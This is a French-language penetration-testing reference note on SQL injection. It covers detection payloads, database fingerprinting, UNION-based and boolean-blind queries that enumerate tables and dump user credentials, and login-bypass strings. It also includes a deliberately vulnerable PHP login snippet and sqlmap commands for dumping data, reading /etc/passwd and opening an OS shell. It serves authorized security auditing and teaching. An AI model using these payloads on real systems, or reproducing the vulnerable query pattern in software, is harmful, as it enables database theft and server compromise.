---
title: Injection SQL
tags:
  - offensif/audit-web-api
  - pentest
  - web
  - owasp
  - injection
  - sqli
---

# Injection SQL

> **Note.** Principe
> Une injection SQL survient lorsqu'une entrée utilisateur est concaténée sans neutralisation dans une requête SQL, permettant à un attaquant d'altérer la logique de la requête exécutée par la base de données. Catégorie A03:2021 (Injection) de l'OWASP Top 10.

## Principe

```sql
-- Requête applicative type
SELECT * FROM users WHERE username = '$username' AND password = '$password';

-- Entrée injectée : username = admin' --
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...';
-- Le commentaire SQL neutralise la vérification du mot de passe
```

## Détection

| Technique | Méthode | Indice de vulnérabilité |
|---|---|---|
| Basée sur les erreurs | Injecter un caractère `'` isolé | Message d'erreur SQL renvoyé (stack trace, syntaxe) |
| Basée sur un booléen | Comparer `AND 1=1` vs `AND 1=2` | Différence de contenu/taille de réponse |
| Basée sur le temps | Injecter `AND SLEEP(5)` (MySQL) ou `WAITFOR DELAY '0:0:5'` (MSSQL) | Délai de réponse mesurable |
| Hors bande (OOB) | Injecter une requête DNS/HTTP vers un domaine contrôlé | Requête reçue sur le serveur d'écoute |

```http
GET /produit?id=1' AND SLEEP(5)-- - HTTP/1.1
Host: exemple.tld
```

> **Note.** Payloads de détection rapide
> `'`, `''`, `"`, `1 OR 1=1`, `1' OR '1'='1`, `1;WAITFOR DELAY '0:0:5'--` couvrent la majorité des moteurs (MySQL, PostgreSQL, MSSQL, Oracle) en première approche.

### Déclenchement d'une erreur

Pour prouver la présence d'une injection, la démarche est la suivante. Soit la requête applicative :

```sql
SELECT * FROM articles WHERE title = '<entree_utilisateur>'
```

Ajouter une apostrophe `'` (ou un guillemet `"` si la requête a été écrite avec des guillemets) casse la requête :

```sql
SELECT * FROM articles WHERE title = '<entree_utilisateur>''
```

Il y a une apostrophe en trop et la requête échoue (dans le meilleur des cas avec un message d'erreur explicite). Si l'erreur disparaît en ajoutant un commentaire (`#` ou `--`) qui neutralise l'apostrophe en trop :

```sql
SELECT * FROM articles WHERE title = '<entree_utilisateur>' #'
SELECT * FROM articles WHERE title = '<entree_utilisateur>' --'
```

alors l'injection SQL est confirmée : tout ce qui est écrit entre le guillemet ajouté et le commentaire est interprété par le moteur SQL.

## Identification du moteur de base de données (SGBD)

| SGBD | Concaténation | Substring | Version |
|---|---|---|---|
| **Oracle** | `'a'\|\|'b'` | `SUBSTR('abc',3,2)` | `SELECT banner FROM v$version` / `SELECT version FROM v$instance` |
| **Microsoft SQL Server** | `'a'+'b'` | `SUBSTRING('abc', 3, 2)` | `SELECT @@version` |
| **PostgreSQL** | `'a'\|\|'b'` | `SUBSTRING('abc', 3, 2)` | `SELECT version()` |
| **MySQL** | `'a' 'b'` ou `CONCAT('a','b')` | `SUBSTRING('abc', 3, 2)` | `SELECT @@version` |

| SGBD | Délai (time-based) | Condition (erreur conditionnelle) |
|---|---|---|
| **Oracle** | `dbms_pipe.receive_message(('a'), 10)` | `SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **Microsoft SQL Server** | `WAITFOR DELAY '0:0:10'` | `SELECT CASE WHEN 1=1 THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `SELECT pg_sleep(10)` | `1 = (SELECT CASE WHEN 1=1 THEN 1/(SELECT 0) ELSE NULL END)` |
| **MySQL** | `SELECT SLEEP(10)` | `SELECT IF (1=1,(SELECT table_name FROM information_schema.tables),'a')` |

## Exploitation manuelle — UNION Based

Technique dans laquelle la valeur renvoyée par la requête injectée via `UNION SELECT` est directement visible dans la réponse applicative.

### Nombre de colonnes de la requête initiale

`UNION SELECT` exige que la ligne ajoutée possède le même nombre de colonnes que la requête existante. La valeur `NULL` est pratique car SQL peut la caster vers n'importe quel type. Tant que le nombre de colonnes ne correspond pas, l'erreur suivante apparaît (ou un code retour 400/500 sans message explicite) :

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Nom de la base de données

```sql
database()
```

### Tables

```sql
UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = '<db_name>' /* MySQL */
UNION SELECT 1, tbl_name, 3 FROM sqlite_master WHERE type='table' /* SQLite */
```

### Colonnes

```sql
UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '<table_name>' /* MySQL */
UNION SELECT 1, group_concat(name), 3 FROM pragma_table_info('<table_name>') /* SQLite */
```

### Données

Exemple avec une table `users` (colonnes `id`, `user`, `password`, `last_login`) :

```sql
UNION SELECT 1, group_concat(id, ':', user, ':', password, ' --- '), 3 FROM users /* MySQL ou SQLite */
```

## Exploitation manuelle — Boolean Based Blind

Technique dans laquelle la réponse de la base de données n'est jamais renvoyée directement : seule une différence booléenne est observable (succès/échec, présence/absence d'erreur). L'exploitation se fait par force brute caractère par caractère pour reconstituer tables, colonnes puis données.

### Contournement d'authentification

Code PHP vulnérable typique :

```php
<?php
	$username = $_POST['username'];
	$password = $_POST['password'];

	$sql = "SELECT * FROM Users WHERE username = '$username' AND password = '$password'";
	$result = mysqli_query($conn, sql);
	$row = mysqli_fetch_array($result);
	$count = mysqli_num_rows($result);

	if($count == 1) {
		echo "Connecté, bienvenue !";
?>
```

En injectant `' OR 1=1 #` ou `' OR 1=1 --;` dans le champ `username`, la requête devient toujours vraie quelle que soit l'existence de l'utilisateur :

```sql
SELECT * FROM Users WHERE username = '$username' AND password = '$password' OR 1=1
```

> **Note.** Résultat multi-lignes
> Si l'application attend explicitement une seule ligne de résultat, ajouter `LIMIT 2,1` pour ne récupérer qu'une ligne à partir de la deuxième.

### Nombre de colonnes via ORDER BY / GROUP BY

`ORDER BY` / `GROUP BY` permet d'observer un changement dans la disposition des données en utilisant l'index de colonne plutôt que son nom, en incrémentant jusqu'à obtenir une erreur :

```sql
' ORDER BY 1 --; /* ou GROUP BY 1 --; */
' ORDER BY 2 --;
' ORDER BY 3 --;
' ORDER BY 4 --;
```

### Tables, colonnes et données via SUBSTRING

```sql
-- Tables (SQLite)
' OR 1=1 AND SUBSTRING((SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'), <index>, 1) = '<caractere>' --

-- Colonnes (SQLite)
' OR 1=1 AND SUBSTRING((SELECT group_concat(name,'|') FROM pragma_table_info('<nom_table>')), <index>, 1) = '<caractere>' --

-- Données (SQLite)
' OR 1=1 AND SUBSTRING((SELECT <nom_colonne> FROM <nom_table>), <index>, 1) = '<caractere>' --
```

## Exploitation avec sqlmap

```bash
# Détection et identification du SGBD sur un paramètre GET
sqlmap -u "https://exemple.tld/produit?id=1" --batch --level=3 --risk=2

# Injection via une requête POST capturée (fichier Burp)
sqlmap -r requete.txt --batch --dbs

# Énumération d'une base identifiée
sqlmap -u "https://exemple.tld/produit?id=1" -D exemple_db --tables
sqlmap -u "https://exemple.tld/produit?id=1" -D exemple_db -T users --dump

# Lecture de fichier / exécution de commande (si privilèges DB suffisants)
sqlmap -u "https://exemple.tld/produit?id=1" --file-read="/etc/passwd"
sqlmap -u "https://exemple.tld/produit?id=1" --os-shell
```

> **Note.** Impact sur la disponibilité
> `--risk=3` active des payloads pouvant altérer des données (UPDATE/DELETE empilés). En audit, limiter `--risk` à 1 ou 2 sauf accord explicite du client, et privilégier une base de recette si disponible.

## Impact

- Extraction de l'intégralité de la base de données (données personnelles, identifiants).
- Contournement d'authentification.
- Écriture de fichiers ou exécution de commandes système (selon privilèges du compte SGBD et configuration : `FILE` sous MySQL, `xp_cmdshell` sous MSSQL).
- Pivot vers le réseau interne si le serveur de base de données y a accès.

## CWE associés

- **CWE-89** : Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **CWE-1286** : Improper Validation of Syntactic Correctness of Input

> **Note.** Cadre d'usage
> Toute injection testée nécessite une autorisation écrite explicite — voir
> [Preambule-et-cadre-legal-Audit-Web-API](../00-Methodologie/Preambule-et-cadre-legal-Audit-Web-API.md).

## Voir également

- [Outil-sqlmap](../04-Outils/Outil-sqlmap.md)
- [Methodologie-generale](../00-Methodologie/Methodologie-generale.md)
- [Audit-Web-et-API-MOC](../Audit-Web-et-API-MOC.md)
